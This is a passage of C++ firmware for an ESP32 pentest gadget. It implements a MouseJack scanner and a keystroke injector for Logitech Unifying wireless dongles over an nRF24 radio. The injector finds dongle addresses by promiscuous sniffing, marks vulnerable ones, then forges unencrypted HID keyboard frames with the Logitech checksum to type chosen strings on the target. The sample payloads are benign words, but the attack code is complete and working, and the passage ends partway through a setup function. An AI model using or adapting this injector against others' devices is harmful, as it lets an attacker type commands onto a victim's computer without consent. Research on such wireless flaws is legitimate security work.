void mouseJackHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_mjLastBtnMs < kMjNavDebounceMs) {
    return;
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    mjClearDevices();
    s_mjLastBtnMs = millis();
    mjWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    mjTogglePause();
    s_mjLastBtnMs = millis();
    mjWaitNavRelease(BTN_DOWN);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 20;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 3;
  // Same 3-icon spacing as Scanner: 170 / 210 / 10.
  static int iconX[kIconN] = {170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], UI_ICON);
      }
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: mjClearDevices(); break;
        case 1: mjTogglePause(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < kIconN; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 2) {
                feature_exit_requested = true;
                scanning = false;
              } else {
                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void mouseJackSetup() {
  setTouchButtonInputEnabled(true);
  neopixelClear();
  bleSetMouseJackNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  scanning = true;
  s_paused = false;
  s_channel = kMjChannels[0];
  s_hopIndex = 0;
  s_lastHopMs = millis();
  s_packetTotal = 0;
  s_deviceCount = 0;
  s_vulnCount = 0;
  s_logIndex = 0;
  s_mjLogDirty = false;
  s_mjStatusDirty = false;
  s_mjListDirty = false;
  s_mjLastUiMs = 0;
  for (int i = 0; i < kMjMaxDevices; i++) {
    s_devices[i].used = false;
  }
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kMjStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  mjDrawTextBoxes();
  mjAppendLogLine("[+] MouseJack Scan ready", UI_WARN);
  mjAppendLogLine("[*] Hopping Unifying channels", UI_DIM_TEXT);
  s_mjStatusDirty = true;
  mjFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  mjInitRadioSpi();
  mjConfigureRadio();
  redrawTouchButtonBar();
}

void mouseJackLoop() {
  scanning = true;
  while (scanning) {
    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }

    mouseJackHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    mjStepHop();
    mjPollPackets();
    mjExpireDevices();
    mjFlushUi(false);
    delay(1);
  }
}

void exit() {
  scanning = false;
  mjDisable();
  mjSetRegister(_MJ_STATUS, 0x70);
  mjFlushRx();
  mjPowerDown();
  mjSetRegister(_MJ_STATUS, 0x70);
  digitalWrite(CSN, HIGH);
  delayMicroseconds(40);
  releaseSharedSpiWithoutSdMount();
}

}  // namespace MouseJack

namespace MouseJackInject {

#define CE  configuredNrfAuxCePin()
#define CSN configuredNrfAuxCsnPin()

void runUI();

#define _INJ_CONFIG     0x00
#define _INJ_EN_AA      0x01
#define _INJ_EN_RXADDR  0x02
#define _INJ_SETUP_AW   0x03
#define _INJ_SETUP_RETR 0x04
#define _INJ_RF_CH      0x05
#define _INJ_RF_SETUP   0x06
#define _INJ_STATUS     0x07
#define _INJ_RX_ADDR_P0 0x0A
#define _INJ_TX_ADDR    0x10
#define _INJ_RX_PW_P0   0x11

static constexpr int kInjPayloadMax = 32;
static constexpr int kInjMaxTargets = kMjSharedMax;
static constexpr int kInjMaxLogLines = 14;
static constexpr int kInjStatusLines = 4;
static constexpr int kInjLineHeight = 12;
static constexpr int kInjToolbarBottom = 36;
static constexpr int kInjToolbarGap = 8;
static constexpr int kInjStatusY = kInjToolbarBottom + kInjToolbarGap;
static constexpr int kInjBoxHeaderH = 15;
static constexpr int kInjStatusTextY = kInjStatusY + kInjBoxHeaderH;
static constexpr int kInjStatusBoxH = kInjBoxHeaderH + (kInjStatusLines * kInjLineHeight) + 4;
static constexpr int kInjLogGap = 4;
static constexpr int kInjLogBoxTop = kInjStatusY + kInjStatusBoxH + kInjLogGap;
static constexpr int kInjLogStartY = kInjLogBoxTop + kInjBoxHeaderH;
static constexpr int kInjLogBottomPad = 4;
static constexpr uint32_t kInjUiMinIntervalMs = 100;
static constexpr uint32_t kInjHopIntervalMs = 50;
static constexpr uint32_t kInjKeyDelayMs = 12;

static const uint8_t kInjChannels[] = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30,
  32, 35, 40, 42, 46, 50, 52, 55, 60, 62, 65, 68, 70, 72, 74, 76, 78, 80, 82
};
static constexpr int kInjChannelCount = sizeof(kInjChannels) / sizeof(kInjChannels[0]);

struct InjTarget {
  uint8_t addr[5];
  uint8_t channel;
  bool used;
  bool vulnerable;
  char vendor[12];
};

static const char* kPayloads[] = {
  "hello",
  "Hello World!",
  "test123",
  "ESP32-DIV",
  "MK_SIGNAL",
  "admin",
};
static constexpr int kPayloadCount = sizeof(kPayloads) / sizeof(kPayloads[0]);

static bool uiDrawn = false;
static volatile bool s_active = false;
static bool s_scanning = false;
static bool s_injecting = false;
static uint8_t s_channel = 2;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static int s_prefixByte = 0;
static int s_targetIndex = 0;
static int s_targetCount = 0;
static int s_payloadIndex = 0;
static uint32_t s_injectCount = 0;

static InjTarget s_targets[kInjMaxTargets];

static String s_logBuffer[kInjMaxLogLines];
static uint16_t s_logColor[kInjMaxLogLines];
static int s_logIndex = 0;
static String s_logDrawn[kInjMaxLogLines];
static uint16_t s_logDrawnColor[kInjMaxLogLines];
static int s_logDrawnW[kInjMaxLogLines];

static String s_statusText[kInjStatusLines];
static uint16_t s_statusColor[kInjStatusLines];
static int s_statusDrawnW[kInjStatusLines];

static bool s_logDirty = false;
static bool s_statusDirty = false;
static uint32_t s_lastUiMs = 0;

static int injLogBoxBottom() { return bleContentBottom() - kInjLogBottomPad; }
static int injLogBoxH() {
  const int h = injLogBoxBottom() - kInjLogBoxTop;
  return h > (kInjBoxHeaderH + kInjLineHeight) ? h : (kInjBoxHeaderH + kInjLineHeight);
}
static int injLogEndY() { return kInjLogBoxTop + injLogBoxH() - 2; }
static int injVisibleLogLines() {
  const int avail = injLogEndY() - kInjLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / kInjLineHeight;
  return n < 1 ? 1 : (n > kInjMaxLogLines ? kInjMaxLogLines : n);
}

static byte injGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void injSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void injWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
}

static void injDisable() { digitalWrite(CE, LOW); }
static void injEnable() { digitalWrite(CE, HIGH); }

static void injPowerUp() {
  injSetRegister(_INJ_CONFIG, injGetRegister(_INJ_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void injPowerDown() {
  injSetRegister(_INJ_CONFIG, injGetRegister(_INJ_CONFIG) & ~0x02);
}

static void injFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void injFlushTx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE1);
  digitalWrite(CSN, HIGH);
}

static void injInitSpi() {
  prepareNrfSharedSpiBus();
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(kNrfSpiHz);
  SPI.setBitOrder(MSBFIRST);
}

static uint8_t injLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool injLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) return false;
  return injLogitechChecksum(p, len) == p[len - 1];
}

static constexpr int kInjStatPadX = 10;
static constexpr int kInjStatValueX = 70;
static constexpr int kInjStatTextDy = 2;

static void injPaintTextLine(int x, int y, int maxW, int lineH,
                             String& cacheText, uint16_t& cacheColor, int& cacheW,
                             const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) return;
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kInjStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void injAppendLog(const String& text, uint16_t color) {
  const int visible = injVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) s_logIndex++;
  s_logDirty = true;
}

static void injRedrawLog() {
  const int endY = injLogEndY();
  const int visible = injVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kInjLogStartY + i * kInjLineHeight;
    if (y + kInjLineHeight > endY) break;
    if (i < s_logIndex) {
      injPaintTextLine(kInjStatPadX, y, maxW, kInjLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       s_logBuffer[i], s_logColor[i]);
    } else {
      injPaintTextLine(kInjStatPadX, y, maxW, kInjLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       String(""), UI_DIM_TEXT);
    }
  }
  s_logDirty = false;
}

static void injDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kInjStatusLines) return;
  const int y = kInjStatusTextY + line * kInjLineHeight;
  const int maxW = tft.width() - kInjStatValueX - 8;
  injPaintTextLine(kInjStatValueX, y, maxW, kInjLineHeight,
                   s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                   text, color);
}

static String injAddrStr(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3], a[4]);
  return String(buf);
}

static void injUpdateStatusPanel() {
  if (s_targetCount > 0 && s_targetIndex >= 0 && s_targetIndex < s_targetCount) {
    const InjTarget& t = s_targets[s_targetIndex];
    char tgt[36];
    snprintf(tgt, sizeof(tgt), "%d/%d %s", s_targetIndex + 1, s_targetCount,
             injAddrStr(t.addr).c_str());
    String s = tgt;
    if (s.length() > 22) s = s.substring(0, 22);
    injDrawStatusValue(0, s, t.vulnerable ? UI_WARN : UI_TEXT);

    char chLine[28];
    snprintf(chLine, sizeof(chLine), "%u  %s%s", (unsigned)t.channel, t.vendor,
             t.vulnerable ? " VULN" : "");
    injDrawStatusValue(1, String(chLine), t.vulnerable ? UI_WARN : UI_DIM_TEXT);
  } else {
    injDrawStatusValue(0, "none — run Scan", UI_DIM_TEXT);
    injDrawStatusValue(1, "from Scan / rescan", UI_DIM_TEXT);
  }

  String pay = kPayloads[s_payloadIndex];
  if (pay.length() > 20) pay = pay.substring(0, 20);
  injDrawStatusValue(2, pay, UI_TEXT);

  if (s_injecting) {
    injDrawStatusValue(3, "Injecting...", UI_WARN);
  } else if (s_scanning) {
    char b[28];
    snprintf(b, sizeof(b), "Scan ch%u p%02X", (unsigned)s_channel, (unsigned)s_prefixByte);
    injDrawStatusValue(3, String(b), ORANGE);
  } else {
    injDrawStatusValue(3, "Ready", UI_OK);
  }
  s_statusDirty = false;
}

static void injDrawTextBoxes() {
  const int logH = injLogBoxH();
  const int endY = injLogEndY();
  tft.fillRect(0, kInjStatusY - 2, tft.width(), endY - kInjStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kInjStatusY, tft.width() - 8, kInjStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kInjLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kInjStatPadX, kInjStatusY + 3);
  tft.print("Inject");
  tft.setCursor(kInjStatPadX, kInjLogBoxTop + 3);
  tft.print("Activity");

  static const char* kLabels[kInjStatusLines] = {"Target", "Ch", "Payload", "State"};
  for (int i = 0; i < kInjStatusLines; i++) {
    const int y = kInjStatusTextY + i * kInjLineHeight + kInjStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kInjStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void injFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_lastUiMs) < kInjUiMinIntervalMs) return;
  if (!force && !s_logDirty && !s_statusDirty) return;
  s_lastUiMs = now;
  if (s_statusDirty || force) injUpdateStatusPanel();
  if (s_logDirty || force) injRedrawLog();
}

static void injImportShared() {
  s_targetCount = 0;
  for (int i = 0; i < kMjSharedMax && s_targetCount < kInjMaxTargets; i++) {
    if (!g_mjShared[i].used) continue;
    InjTarget& t = s_targets[s_targetCount];
    memcpy(t.addr, g_mjShared[i].addr, 5);
    t.channel = g_mjShared[i].channel;
    t.vulnerable = g_mjShared[i].vulnerable;
    t.used = true;
    strncpy(t.vendor, g_mjShared[i].vendor, sizeof(t.vendor) - 1);
    t.vendor[sizeof(t.vendor) - 1] = '\0';
    if (!t.vendor[0]) strcpy(t.vendor, "nRF");
    s_targetCount++;
  }
  if (s_targetIndex >= s_targetCount) s_targetIndex = 0;
}

static int injFindTarget(const uint8_t* addr) {
  for (int i = 0; i < s_targetCount; i++) {
    if (memcmp(s_targets[i].addr, addr, 5) == 0) return i;
  }
  return -1;
}

static void injAddTarget(const uint8_t* addr, uint8_t ch, bool vulnerable, const char* vendor) {
  int idx = injFindTarget(addr);
  if (idx < 0) {
    if (s_targetCount >= kInjMaxTargets) return;
    idx = s_targetCount++;
    memset(&s_targets[idx], 0, sizeof(InjTarget));
    memcpy(s_targets[idx].addr, addr, 5);
    s_targets[idx].used = true;
  }
  s_targets[idx].channel = ch;
  if (vulnerable) s_targets[idx].vulnerable = true;
  if (vendor && vendor[0]) {
    strncpy(s_targets[idx].vendor, vendor, sizeof(s_targets[idx].vendor) - 1);
  }
  mjSharedPublish(addr, ch, vulnerable, vendor);
}

static void injConfigureRx(uint8_t prefix) {
  injDisable();
  injPowerUp();
  // 3-byte address for remnant recovery (Goodspeed-style)
  const uint8_t addr3[5] = {prefix, 0x00, 0x00, 0x00, 0x00};
  injWriteRegMulti(_INJ_RX_ADDR_P0, addr3, 5);
  injSetRegister(_INJ_SETUP_AW, 0x01);  // 3-byte address
  injSetRegister(_INJ_EN_AA, 0x00);
  injSetRegister(_INJ_EN_RXADDR, 0x01);
  injSetRegister(_INJ_SETUP_RETR, 0x00);
  injSetRegister(_INJ_RF_SETUP, 0x0F);  // 2Mbps
  injSetRegister(_INJ_RX_PW_P0, kInjPayloadMax);
  injSetRegister(_INJ_CONFIG, 0x03);    // PWR_UP | PRIM_RX, CRC off
  injSetRegister(_INJ_RF_CH, s_channel);
  injFlushRx();
  injEnable();
  delayMicroseconds(130);
}

static void injConfigureTx(const uint8_t* addr5, uint8_t ch) {
  injDisable();
  injPowerUp();
  injWriteRegMulti(_INJ_TX_ADDR, addr5, 5);
  injWriteRegMulti(_INJ_RX_ADDR_P0, addr5, 5);
  injSetRegister(_INJ_SETUP_AW, 0x03);  // 5-byte
  injSetRegister(_INJ_EN_AA, 0x00);
  injSetRegister(_INJ_EN_RXADDR, 0x01);
  injSetRegister(_INJ_SETUP_RETR, 0x00);
  injSetRegister(_INJ_RF_SETUP, 0x0F);
  injSetRegister(_INJ_RX_PW_P0, 10);
  injSetRegister(_INJ_RF_CH, ch);
  // PWR_UP | PRIM_TX | EN_CRC | CRCO (2-byte CRC) — Logitech uses ESB CRC
  injSetRegister(_INJ_CONFIG, 0x0E);
  injFlushTx();
  injFlushRx();
}

static bool injRxAvailable() {
  return (injGetRegister(_INJ_STATUS) & 0x40) != 0;
}

static void injPollScanPacket() {
  if (!injRxAvailable()) return;
  uint8_t payload[kInjPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kInjPayloadMax; i++) payload[i] = SPI.transfer(0xFF);
  digitalWrite(CSN, HIGH);
  injSetRegister(_INJ_STATUS, 0x70);

  // Reconstruct: addr = {prefix, 0x00, 0x00, p0, p1}, HID starts at p2
  // Also try HID at p0 (if full payload landed).
  uint8_t addr[5] = {(uint8_t)s_prefixByte, 0x00, 0x00, payload[0], payload[1]};
  const uint8_t* hid = payload + 2;
  int hidLen = 10;
  bool ok = injLooksLikeLogitech(hid, 10);
  if (!ok && injLooksLikeLogitech(payload, 10)) {
    // Payload already starts with HID — address incomplete; still store fingerprint addr
    hid = payload;
    ok = true;
    // Prefer using prefix + first bytes as tracking id
  }
  if (!ok) return;

  const bool vuln = (hid[1] == 0xC1 || hid[1] == 0x10 || hid[1] == 0x00);
  injAddTarget(addr, s_channel, vuln, "Logitech");
  injAppendLog(String("+ ") + injAddrStr(addr) + " ch" + String(s_channel),
               vuln ? UI_WARN : UI_OK);
  s_statusDirty = true;
}

static void injScanStep() {
  if (!s_scanning || s_injecting) return;
  const uint32_t now = millis();
  if (now - s_lastHopMs < kInjHopIntervalMs) {
    injPollScanPacket();
    return;
  }
  s_lastHopMs = now;

  // Advance prefix, then channel
  s_prefixByte++;
  if (s_prefixByte > 0x7F) {  // cover common Unifying high-bit-clear range quickly
    s_prefixByte = 0;
    s_hopIndex = (s_hopIndex + 1) % kInjChannelCount;
    s_channel = kInjChannels[s_hopIndex];
  }
  injConfigureRx((uint8_t)s_prefixByte);
  s_statusDirty = true;
  injPollScanPacket();
}

static void injStartScan() {
  s_scanning = true;
  s_prefixByte = 0;
  s_hopIndex = 0;
  s_channel = kInjChannels[0];
  injConfigureRx(0);
  injAppendLog("[+] Scanning for Unifying HID", UI_WARN);
  s_statusDirty = true;
  injFlushUi(true);
}

static void injStopScan() {
  if (!s_scanning) return;
  s_scanning = false;
  injDisable();
  injAppendLog(String("[*] Scan stop — ") + String(s_targetCount) + " targets", UI_DIM_TEXT);
  s_statusDirty = true;
  injFlushUi(true);
}

// USB HID keyboard scancodes (subset).
static bool injCharToHid(char c, uint8_t& modifier, uint8_t& key) {
  modifier = 0;
  key = 0;
  if (c >= 'a' && c <= 'z') {
    key = 0x04 + (c - 'a');
    return true;
  }
  if (c >= 'A' && c <= 'Z') {
    modifier = 0x02;  // Left Shift
    key = 0x04 + (c - 'A');
    return true;
  }
  if (c >= '1' && c <= '9') {
    key = 0x1E + (c - '1');
    return true;
  }
  if (c == '0') { key = 0x27; return true; }
  switch (c) {
    case ' ': key = 0x2C; return true;
    case '\n': case '\r': key = 0x28; return true;
    case '\t': key = 0x2B; return true;
    case '-': key = 0x2D; return true;
    case '=': key = 0x2E; return true;
    case '[': key = 0x2F; return true;
    case ']': key = 0x30; return true;
    case '\\': key = 0x31; return true;
    case ';': key = 0x33; return true;
    case '\'': key = 0x34; return true;
    case '`': key = 0x35; return true;
    case ',': key = 0x36; return true;
    case '.': key = 0x37; return true;
    case '/': key = 0x38; return true;
    case '!': modifier = 0x02; key = 0x1E; return true;
    case '@': modifier = 0x02; key = 0x1F; return true;
    case '#': modifier = 0x02; key = 0x20; return true;
    case '$': modifier = 0x02; key = 0x21; return true;
    case '%': modifier = 0x02; key = 0x22; return true;
    case '^': modifier = 0x02; key = 0x23; return true;
    case '&': modifier = 0x02; key = 0x24; return true;
    case '*': modifier = 0x02; key = 0x25; return true;
    case '(': modifier = 0x02; key = 0x26; return true;
    case ')': modifier = 0x02; key = 0x27; return true;
    case '_': modifier = 0x02; key = 0x2D; return true;
    case '+': modifier = 0x02; key = 0x2E; return true;
    case '{': modifier = 0x02; key = 0x2F; return true;
    case '}': modifier = 0x02; key = 0x30; return true;
    case '|': modifier = 0x02; key = 0x31; return true;
    case ':': modifier = 0x02; key = 0x33; return true;
    case '"': modifier = 0x02; key = 0x34; return true;
    case '<': modifier = 0x02; key = 0x36; return true;
    case '>': modifier = 0x02; key = 0x37; return true;
    case '?': modifier = 0x02; key = 0x38; return true;
    default: return false;
  }
}

static void injWritePayload(const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xA0);  // W_TX_PAYLOAD
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);

  injSetRegister(_INJ_STATUS, 0x70);
  // CE pulse to transmit
  injEnable();
  delayMicroseconds(15);
  injDisable();
  delayMicroseconds(150);
}

static void injSendHidFrame(uint8_t modifier, uint8_t key) {
  // Unencrypted Logitech Unifying keyboard frame (BN-0002 style)
  uint8_t frame[10] = {
    0x00, 0xC1, modifier, key, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  frame[9] = injLogitechChecksum(frame, 10);
  injWritePayload(frame, 10);
}

static void injSendKeepalive() {
  uint8_t payload[5];
  payload[0] = 0x00;
  payload[1] = 0x40;
  payload[2] = 0x4F;
  payload[3] = 110;
  payload[4] = 0;
  payload[4] = injLogitechChecksum(payload, 5);
  injWritePayload(payload, 5);
}

static void injTransmitString(const char* text) {
  if (s_targetCount <= 0 || s_targetIndex < 0 || s_targetIndex >= s_targetCount) {
    injAppendLog("[!] No target selected", UI_WARN);
    injFlushUi(true);
    return;
  }
  if (s_injecting) return;

  const InjTarget& t = s_targets[s_targetIndex];
  s_injecting = true;
  s_scanning = false;
  s_statusDirty = true;
  injFlushUi(true);

  injAppendLog(String("[>] Fire -> ") + injAddrStr(t.addr), UI_WARN);
  injFlushUi(true);

  injConfigureTx(t.addr, t.channel);
  injSendKeepalive();
  delay(5);

  // Also try nearby channels (dongles hop)
  const int chTry[3] = {t.channel, (t.channel + 1) % 84, (t.channel + 83) % 84};

  for (size_t ci = 0; text[ci]; ci++) {
    if (feature_exit_requested || featureExitButtonPressed()) break;

    uint8_t mod = 0, key = 0;
    if (!injCharToHid(text[ci], mod, key)) continue;

    for (int c = 0; c < 3; c++) {
      injSetRegister(_INJ_RF_CH, (uint8_t)chTry[c]);
      injSendHidFrame(mod, key);           // key down
      delay(kInjKeyDelayMs);
      injSendHidFrame(0x00, 0x00);         // key up
      delay(kInjKeyDelayMs);
    }
    s_injectCount++;

    if ((ci % 4) == 0) {
      maintainTouchNavBar();
      runUI();
      s_statusDirty = true;
      injFlushUi(false);
    }
  }

  injSendKeepalive();
  injDisable();
  injAppendLog(String("[+] Done (") + String(strlen(text)) + " chars)", UI_OK);
  s_injecting = false;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injPrevTarget() {
  if (s_targetCount <= 0) return;
  s_targetIndex = (s_targetIndex - 1 + s_targetCount) % s_targetCount;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injNextTarget() {
  if (s_targetCount <= 0) return;
  s_targetIndex = (s_targetIndex + 1) % s_targetCount;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injNextPayload() {
  s_payloadIndex = (s_payloadIndex + 1) % kPayloadCount;
  s_statusDirty = true;
  injAppendLog(String("[*] Payload: ") + kPayloads[s_payloadIndex], UI_DIM_TEXT);
  injFlushUi(true);
}

static void injToggleScanOrFire() {
  // UP = Fire
  injStopScan();
  injTransmitString(kPayloads[s_payloadIndex]);
}

static unsigned long s_injLastBtnMs = 0;

static void injWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isButtonPressed(pin) && millis() - t0 < 400) delay(5);
  delay(30);
}

void injHandleNavButtons() {
  if (!featureHasTouchNavBar()) return;
  if (millis() - s_injLastBtnMs < 80) return;

  if (isButtonPressedEdge(BTN_LEFT)) {
    injPrevTarget();
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    injNextTarget();
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    if (s_scanning) {
      injStopScan();
    } else {
      injNextPayload();
    }
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (s_targetCount == 0 || s_scanning) {
      if (s_scanning) injStopScan();
      else injStartScan();
    } else {
      injToggleScanOrFire();
    }
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_UP);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 20;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_start,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i]) drawToolbarIcon(iconX[i], iconY, icons[i], UI_ICON);
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: injPrevTarget(); break;
        case 1:
          if (s_scanning) injStopScan();
          else injStartScan();
          break;
        case 2:
          if (s_targetCount == 0) injStartScan();
          else injToggleScanOrFire();
          break;
        case 3: injNextTarget(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < kIconN; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                s_active = false;
              } else {
                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void mouseJackInjectSetup() {
  setTouchButtonInputEnabled(true);
  neopixelClear();
  bleSetMjInjectNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  s_active = true;
  s_scanning = false;
  s_injecting = false;
  s_channel = kInjChannels[0];
  s_hopIndex = 0;
  s_prefixByte = 0;
  s_lastHopMs = millis();
  s_payloadIndex = 0;
  s_injectCount = 0;
  s_logIndex = 0;
  s_logDirty = false;
  s_statusDirty = false;
  s_lastUiMs = 0;

  for (int i = 0; i < kInjMaxLogLines; i++) {
    s_logBuffer[i] = "";
